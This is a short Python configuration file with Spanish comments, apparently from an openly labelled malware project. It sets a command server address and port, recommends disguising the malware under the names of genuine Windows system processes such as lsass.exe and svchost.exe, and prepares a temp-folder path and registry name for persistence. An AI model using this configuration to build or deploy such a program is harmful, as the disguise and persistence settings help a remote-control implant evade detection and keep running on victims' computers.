
import tempfile

# CONFIGURACION DEL SERVIDOR

IP = "192.168.0.15"
PORT = 9000


# PERSISTENCIA WINDOWS

# Nombres recomendables para Windows: csrss.exe, lsass.exe, mstask.exe, smss.exe, spoolsv.exe, svchost.exe

NOMBRE_MALWARE = "lsass.exe"
RUTA_MALWARE_DESTINO = tempfile.gettempdir() + "\\" + NOMBRE_MALWARE
NOMBRE_REGISTRO_MALWARE = NOMBRE_MALWARE[:-4]